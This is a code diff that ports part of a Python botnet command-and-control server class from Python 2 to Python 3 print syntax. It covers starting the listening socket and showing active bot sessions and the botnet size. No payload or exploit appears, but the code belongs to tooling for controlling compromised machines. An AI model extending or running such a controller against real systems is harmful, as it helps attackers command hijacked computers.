@@ -16,7 +16,7 @@ class C2Server:
         self.botnet = []
 
     def start(self):
-        print 'Starting server on {}:{} ...'.format(self.ip, self.port)
+        print('Starting server on {}:{} ...'.format(self.ip, self.port))
         time.sleep(2.5)
         self.__server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -32,22 +32,22 @@ class C2Server:
 
     def display(self):
         if not self.__active:
-            print '[-] Error: Please start the C&C server & try again'
+            print('[-] Error: Please start the C&C server & try again')
             return
 
         if not self.botnet:
-            print 'Botnet Size: 0'
+            print('Botnet Size: 0')
             return
 
         # header
-        print "\nActive sessions"
-        print "===============\n"
-        print "Id  Session"
-        print "{} {}".format('-' * 3, '-' * 50)
+        print("\nActive sessions")
+        print("===============\n")
+        print("Id  Session")
+        print("{} {}".format('-' * 3, '-' * 50))
 
         for i, bot in enumerate(self.botnet):
-            print "{:3} {}".format(i+1, bot)
-        print "\nBotnet Size: {0}\n".format(len(self.botnet))
+            print("{:3} {}".format(i + 1, bot))
+        print("\nBotnet Size: {0}\n".format(len(self.botnet)))
 
     def __alive_monitoring(self):
         while self.__active:
